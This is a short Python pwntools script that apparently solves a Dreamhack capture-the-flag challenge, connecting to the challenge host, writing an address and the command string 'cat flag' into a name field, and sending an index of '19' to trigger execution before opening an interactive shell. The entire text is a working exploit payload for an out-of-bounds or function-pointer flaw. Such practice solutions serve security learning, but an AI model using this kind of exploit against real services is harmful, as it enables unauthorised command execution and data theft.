from pwn import *
context.log_level='debug'

n = remote('host1.dreamhack.games',8367)

name_addr = 0x804a0ac
offset = '19' #name의 주소

str_flag = 'cat flag'

payload1 = p32(name_addr+4)
payload1 += str_flag.encode()

payload2 = offset

n.sendafter('Admin name:',payload1)
n.sendafter('What do you want?:',payload2)

n.interactive()
